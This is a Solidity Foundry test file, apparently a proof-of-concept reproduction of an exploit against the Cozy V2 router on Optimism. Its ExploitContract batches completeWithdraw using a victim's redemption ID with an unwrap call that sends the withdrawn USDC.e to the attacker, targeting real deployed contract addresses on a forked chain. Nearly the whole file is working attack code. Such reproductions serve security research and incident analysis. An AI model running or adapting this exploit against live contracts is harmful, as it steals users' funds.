// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

/*
Precondition: The attacker detects that the victim has called redeem and obtains the associated redemption ID.
The attacker then executes the attack flow below, supplying that redemption ID in the calldata.
*/

interface ISet {}

interface ICozyRouter {
    function aggregate(
        bytes[] memory calls_
    ) external payable returns (bytes[] memory returnData_);

    function completeWithdraw(ISet set_, uint64 id_) external payable;

    function unwrapWrappedAssetViaConnectorForWithdraw(
        address connector_,
        address receiver_
    ) external payable;
}

contract CozyV2PoC is Test {
    ExploitContract exploitContract;

    constructor() {
        vm.createSelectFork("op", 140421918 - 1);
        exploitContract = new ExploitContract();
    }

    function testExploit() external {
        exploitContract.exploit();
    }
}

contract ExploitContract {
    ICozyRouter cozyRouter;
    ISet set;
    IERC20 USDCe;

    constructor() {
        cozyRouter = ICozyRouter(0x562460D8cFB40Ada3eA91d8Cf98eAF25D53d53D8);
        set = ISet(0xBBf3a80c2ec900d877c13302f4407df08AeFfd28);
        USDCe = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    }

    function exploit() external {
        // Attack batch execution calldata
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature(
            "completeWithdraw(address,uint64)",
            set,
            6 // victim redemption id
        );

        calls[1] = abi.encodeWithSignature(
            "unwrapWrappedAssetViaConnectorForWithdraw(address,address)",
            0xEABD74ee7399b38d63069039BbD9F1c2fcC8EB88, // connector
            address(this) // receiver
        );

        cozyRouter.aggregate(calls);

        uint256 usdcBalance = USDCe.balanceOf(address(this));
        console.log(
            "Attacker USDC.e balance after exploit:",
            usdcBalance / 1e6
        );
    }
}
